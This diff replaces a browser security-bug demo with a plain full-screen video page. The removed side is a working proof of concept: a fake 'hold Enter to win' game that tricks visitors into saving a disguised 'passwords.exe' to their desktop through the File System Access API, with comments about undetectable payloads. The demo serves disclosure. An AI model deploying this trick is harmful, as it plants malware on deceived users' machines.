@@ -1,113 +1,59 @@
-<html>
-
+<!DOCTYPE html>
+<html lang="id">
 <head>
-    <title>Save file to desktop - File System Access API - security bug</title>
-    <meta charset="UTF-8">
-</head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+
+<title>Full View Video</title>
 
 <style>
-    body {
-        background: rgba(29, 48, 109, 0.849);
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        flex-direction: column;
-    }
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
 
-    h1,h2,h3{
-        -webkit-text-stroke: 1px #00000050;
-    }
+html,body{
+    width:100%;
+    height:100%;
+    overflow:hidden;
+    background:#000;
+}
 
-    h1{
-        color:#D96C06;
-        font-size: 56px;
-    }
-    h2{
-        color: #1ebe8e;
-        font-size: 56px;
-    }
-    h3 {
-        color: #C6F91F; 
-        font-size: 56px;               
-    }
-    h2 span{
-        color: #cf4848;
-        font-size: 90px;
-    }
+/* Video keluar dari semua area konten */
+.video-full{
+    position:fixed;
+    top:0;
+    left:0;
 
-    #author{
-        font-size: 28px;
-    }
+    width:100vw;
+    height:100vh;
+
+    width:100dvw;
+    height:100dvh;
+
+    width:100svw;
+    height:100svh;
+
+    object-fit:cover;
+    background:#000;
+}
 </style>
 
+</head>
 
 <body>
-    <script>
-        //how many time enter clicked in row
-        let countEnter = 0;
-        //is file downloaded
-        let isDownloaded = false;
 
-        //on page load
-        window.onload = function () {
-            const body = document.querySelector('body')
-            const pixel = document.querySelector('#pixel')
+<video 
+    class="video-full"
+    autoplay
+    muted
+    loop
+    playsinline>
 
-            body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
-            body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;
+    <source src="Code_-_Insiders_mSfUtYR5tL.mp4" type="video/mp4">
 
-            pixel.addEventListener('click', async () => {
-                const options = {
-                    startIn: 'desktop',
-                    suggestedName: 'passwords',
-                    types: [
-                        {
-                            description:
-                                'Chromium Settings',
-                            accept: {
-                                'text/plain': ['.exe'] //could be .exe/.bat or anything
-                            }
-                        }
-                    ],
-                    //delete from Save as type "*.*" option
-                    excludeAcceptAllOption: true
-                }
-
-                const handle = await window.showSaveFilePicker(options);
-                const writable = await handle.createWritable();
-                // 1) download file from local/server (Good for exe)
-                //you need to have FUD file lnkextra.lnk on server/local
-                //can be changed to diffrent file like cat.jpg
-                const response = await fetch('passwords.exe');
-                await response.body.pipeTo(writable);
-
-                document.querySelector("#gameover").textContent = "GAME OVER - Need refresh to start again"
-            })
-        };
-
-        function clickedEnter() {
-            countEnter++;            
-            //if button was hold more then 1 second and it wasn't downloaded - we can change !isDownloaded to countEnter % 30 === 0 to download many files
-            if (countEnter > 5 && !isDownloaded) {
-                pixel.click()
-                //set file is downloaded
-                isDownloaded = true;
-            }
-        }
-
-        function cancelEnter() {
-            //reset count enter if enter is not hold
-            countEnter = 0;
-        }
-    </script>
-    <!-- div used to click to open Save As dialog -->
-    <div id="pixel"></div>
-    <h1>Super Simple Game😻😻😻</h1>
-    <h2><span>⌨️HOLD ENTER</span> for 5 seconds</h2>
-    <h3>win $1,000,000 and rule the world! 🔥🔥🔥🚀</h3>
-    <h3 id="author">Author: <a href="http://pulik.io" style="color: rgb(49, 161, 252);">Maciej Pulikowski (pulik.io)</a> 🧙🐱‍👓</h3>
-    <h3 id="gameover"></h3>
+</video>
 
 </body>
-
 </html>
